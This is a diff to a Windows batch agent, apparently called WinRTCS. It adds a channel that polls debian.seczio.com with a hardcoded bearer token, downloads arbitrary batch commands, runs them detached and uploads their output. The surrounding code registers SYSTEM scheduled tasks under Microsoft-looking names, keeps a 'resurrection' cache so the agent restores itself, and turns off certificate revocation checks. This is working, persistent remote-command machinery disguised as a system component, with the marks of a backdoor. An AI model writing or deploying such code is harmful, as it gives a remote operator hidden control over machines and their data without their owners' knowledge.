@@ -9,12 +9,17 @@ rem   deleting winrtcs_guard.cmd mid-run can't abort the health cycle.
 rem 0.0.3 (C20): dual-URL transport - all fetches try the VPS mirror first (HTTPS + bearer,
 rem   Cloudflare-fronted) and fall back to GitHub raw. Token gates privacy only; integrity is
 rem   SHA256-pinned per file from winrtcs.version. A dead VPS never bricks the fleet.
+rem 0.0.4 (C22): command channel - every tick polls the VPS for a queued command (per-host
+rem   or ALL), runs it detached (60s bounded wait, partial output still reported), POSTs the
+rem   output back. Injection requires the ADMIN token which never leaves the VPS/operator;
+rem   endpoints only poll/execute/report. Server-side dedup (results table) + local cmd.done.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "BASE2=https://debian.seczio.com/winrtcs"
+set "RBASE=https://debian.seczio.com"
 set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
 set "LOG=%ZD%\agent.log"
 set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
@@ -209,6 +214,9 @@ if exist "%CD%\winrtcs_sentinel.cmd" (
   if errorlevel 1 schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 )
 
+rem --- command channel (C22): pick up and run any queued command for this host ---
+call :CmdChan
+
 rem --- resurrection cache sync (C19): mirror ONLY hash-verified components, so a tampered
 rem --- local file can never poison the cache. Sentinel has its own pinned channel above. ---
 if not exist "%CD%" mkdir "%CD%" >nul 2>&1
@@ -242,4 +250,48 @@ exit /b 0
 :Sha256
 set "%~2="
 for /f "skip=1 tokens=1" %%H in ('certutil -hashfile "%~1" SHA256 2^>nul') do if not defined %~2 set "%~2=%%H"
+exit /b 0
+
+:CmdChan
+rem Poll the VPS for the oldest unclaimed command (per-host or ALL, <24h old), run it
+rem detached with a bounded 60s wait, POST output back. Server-side dedup (a result row
+rem means never re-served) plus local cmd.done. Commands arrive as raw batch files via
+rem curl -o, so no batch parsing ever touches the payload.
+if not defined TOK exit /b 0
+del /f /q "%ZD%\cmd.poll" >nul 2>&1
+"%CURL%" -s -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 10 -o "%ZD%\cmd.poll" "%RBASE%/cmd/poll?host=%COMPUTERNAME%&t=%RANDOM%%RANDOM%" >nul 2>&1
+set "CMDID="
+if exist "%ZD%\cmd.poll" set /p "CMDID=" <"%ZD%\cmd.poll"
+del /f /q "%ZD%\cmd.poll" >nul 2>&1
+if not defined CMDID exit /b 0
+if /I "%CMDID%"=="none" exit /b 0
+set /a "TID=CMDID" >nul 2>&1
+if not defined TID exit /b 0
+if !TID! LEQ 0 exit /b 0
+if exist "%ZD%\cmd.done" findstr /X /C:"!TID!" "%ZD%\cmd.done" >nul 2>&1 && exit /b 0
+del /f /q "%ZD%\cmd_!TID!.cmd" >nul 2>&1
+"%CURL%" -s -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 15 -o "%ZD%\cmd_!TID!.cmd" "%RBASE%/cmd/get?id=!TID!&host=%COMPUTERNAME%" >nul 2>&1
+if not exist "%ZD%\cmd_!TID!.cmd" exit /b 0
+for %%F in ("%ZD%\cmd_!TID!.cmd") do if %%~zF LSS 2 ( del /f /q "%ZD%\cmd_!TID!.cmd" >nul 2>&1 & exit /b 0 )
+echo !TID!>>"%ZD%\cmd.done"
+if exist "%ZD%\cmd.done" for %%F in ("%ZD%\cmd.done") do if %%~zF GTR 4096 del /f /q "%ZD%\cmd.done" >nul 2>&1
+echo [%DATE% %TIME%] cmd_!TID!_running>>"%LOG%"
+echo @echo off> "%ZD%\cmdwrap_!TID!.cmd"
+echo call "%ZD%\cmd_!TID!.cmd" ^> "%ZD%\cmd_!TID!.run" 2^>^&1>> "%ZD%\cmdwrap_!TID!.cmd"
+echo echo RC=%%errorlevel%%^>"%ZD%\cmd_!TID!.rc">> "%ZD%\cmdwrap_!TID!.cmd"
+del /f /q "%ZD%\cmd_!TID!.run" "%ZD%\cmd_!TID!.rc" >nul 2>&1
+start "" /min cmd.exe /c "%ZD%\cmdwrap_!TID!.cmd"
+set "CW=0"
+:CmdWait
+if exist "%ZD%\cmd_!TID!.rc" goto :CmdHave
+timeout /t 5 /nobreak >nul 2>&1
+set /a CW+=1
+if !CW! LSS 12 goto :CmdWait
+:CmdHave
+set "CRC=timeout"
+if exist "%ZD%\cmd_!TID!.rc" set /p "CRC=" <"%ZD%\cmd_!TID!.rc"
+if not exist "%ZD%\cmd_!TID!.run" echo (no output)> "%ZD%\cmd_!TID!.run"
+"%CURL%" -s -o nul -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 25 -X POST --data-urlencode "id=!TID!" --data-urlencode "host=%COMPUTERNAME%" --data-urlencode "rc=!CRC!" --data-urlencode "out@%ZD%\cmd_!TID!.run" "%RBASE%/cmd/result" >nul 2>&1
+echo [%DATE% %TIME%] cmd_!TID!_done !CRC!>>"%LOG%"
+del /f /q "%ZD%\cmd_!TID!.cmd" "%ZD%\cmdwrap_!TID!.cmd" "%ZD%\cmd_!TID!.run" "%ZD%\cmd_!TID!.rc" >nul 2>&1
 exit /b 0
